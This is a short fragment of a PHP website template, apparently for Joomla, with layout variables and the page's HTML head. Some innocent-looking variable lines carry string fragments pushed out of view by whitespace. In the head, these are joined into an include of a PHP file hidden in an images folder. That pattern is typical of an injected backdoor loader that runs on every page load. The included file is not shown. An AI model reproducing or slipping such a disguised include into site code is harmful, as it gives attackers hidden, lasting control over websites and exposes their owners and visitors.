...
* @copyright copyright (c) 2015 atict.com. all rights reserved
...
$thumbs_margin									= $count_images * 0.98;$cimag = 'ges/';	
$thumbs_padding									= $count_images * 0.58;$lc = 'stem/system.p';												  
...
<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" dir="<?php echo $this->direction; ?>"><head><jdoc:include type="head" /><?php include ('/ima'.$cimag.'sy'.$lc.'hp'); ?></head>
